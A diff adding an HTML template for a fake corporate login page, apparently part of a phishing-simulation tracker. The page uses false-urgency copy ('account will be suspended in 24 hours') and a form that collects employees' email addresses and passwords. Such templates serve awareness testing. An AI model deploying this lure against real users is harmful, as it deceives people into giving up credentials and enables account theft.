@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Verification Required — SecurePortal</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #f0f2f5;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        /* Fake corporate header */
+        .corp-header {
+            width: 100%;
+            max-width: 480px;
+            background: #1a56db;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 12px 12px 0 0;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .corp-logo { font-size: 1.5rem; }
+        .corp-name { font-size: 1.1rem; font-weight: 700; }
+        .corp-sub { font-size: 0.75rem; opacity: 0.8; }
+
+        .phish-card {
+            width: 100%;
+            max-width: 480px;
+            background: white;
+            border-radius: 0 0 12px 12px;
+            box-shadow: 0 8px 40px rgba(0,0,0,0.15);
+            padding: 36px 40px;
+        }
+        .phish-card h1 {
+            font-size: 1.4rem;
+            font-weight: 700;
+            color: #111827;
+            margin-bottom: 6px;
+        }
+        .phish-card .sub {
+            color: #6b7280;
+            font-size: 0.9rem;
+            margin-bottom: 28px;
+            line-height: 1.5;
+        }
+        .alert-box {
+            background: #fef3c7;
+            border: 1px solid #f59e0b;
+            border-radius: 8px;
+            padding: 12px 16px;
+            margin-bottom: 24px;
+            font-size: 0.85rem;
+            color: #92400e;
+            display: flex;
+            gap: 8px;
+            align-items: flex-start;
+        }
+        .form-group { margin-bottom: 18px; }
+        .form-group label {
+            display: block;
+            font-size: 0.875rem;
+            font-weight: 500;
+            color: #374151;
+            margin-bottom: 6px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 11px 14px;
+            border: 1.5px solid #d1d5db;
+            border-radius: 8px;
+            font-size: 0.95rem;
+            font-family: 'Inter', sans-serif;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        .form-group input:focus { border-color: #1a56db; }
+        .submit-btn {
+            width: 100%;
+            padding: 13px;
+            background: linear-gradient(135deg, #1a56db, #1e40af);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: 'Inter', sans-serif;
+            transition: opacity 0.2s;
+            margin-top: 6px;
+        }
+        .submit-btn:hover { opacity: 0.9; }
+        .footer-links {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 0.8rem;
+            color: #9ca3af;
+        }
+        .footer-links a { color: #6b7280; text-decoration: none; margin: 0 8px; }
+    </style>
+</head>
+<body>
+    <div class="corp-header">
+        <div class="corp-logo">🏢</div>
+        <div>
+            <div class="corp-name">SecurePortal — Employee Access</div>
+            <div class="corp-sub">Your Company IT Security Team</div>
+        </div>
+    </div>
+
+    <div class="phish-card">
+        <h1>Account Verification Required</h1>
+        <p class="sub">
+            Unusual activity was detected on your account. 
+            Please verify your identity to restore access and secure your data.
+        </p>
+
+        <div class="alert-box">
+            ⚠️ Your account will be suspended in <strong>24 hours</strong> if not verified. 
+            Please sign in immediately to confirm your identity.
+        </div>
+
+        <form method="POST" action="{{ url_for('tracker.phish_submit') }}">
+            <input type="hidden" name="token" value="{{ token }}">
+
+            <div class="form-group">
+                <label for="phish-email">Corporate Email Address</label>
+                <input type="email" id="phish-email" name="email" 
+                       value="{{ prefill_email }}" 
+                       placeholder="yourname@company.com" required>
+            </div>
+
+            <div class="form-group">
+                <label for="phish-password">Password</label>
+                <input type="password" id="phish-password" name="password" 
+                       placeholder="Enter your account password" required>
+            </div>
+
+            <button type="submit" class="submit-btn">Verify My Account →</button>
+        </form>
+
+        <div class="footer-links">
+            <a href="#">Privacy Policy</a>
+            <a href="#">Terms of Service</a>
+            <a href="#">Help Center</a>
+        </div>
+    </div>
+</body>
+</html>
